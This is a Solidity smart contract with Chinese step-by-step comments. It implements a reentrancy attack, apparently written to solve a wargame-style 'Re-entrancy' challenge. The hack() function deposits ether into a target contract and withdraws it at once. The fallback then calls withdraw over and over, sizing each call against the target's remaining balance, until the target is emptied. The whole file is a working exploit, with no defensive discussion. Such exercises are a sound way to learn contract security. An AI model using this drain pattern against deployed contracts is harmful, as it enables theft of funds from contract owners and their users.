// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract HackReentrancy {
    IReentrance private reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function hack() external payable {
        // 1. 先充值
        reentrance.donate{value: msg.value}(address(this));
        // 2. 立刻提款，触发fallback
        reentrance.withdraw(msg.value);
    }

    fallback() external payable {
        // 1. 判断余额
        uint256 allLeft = address(reentrance).balance;
        uint256 usLeft = reentrance.balanceOf(address(this));
        if (allLeft > usLeft) {
            // 1.a 如果余额超过自己注资的钱，则按照最大量递归
            reentrance.withdraw(usLeft);
        } else if (allLeft > 0) {
            // 1.b 如果余额已经低于自己注资的钱，则可以最后一次全部取走
            reentrance.withdraw(allLeft);
        }
        // 1.c 如果已经全部被取出来了，则停止递归调用，完成任务
    }
}
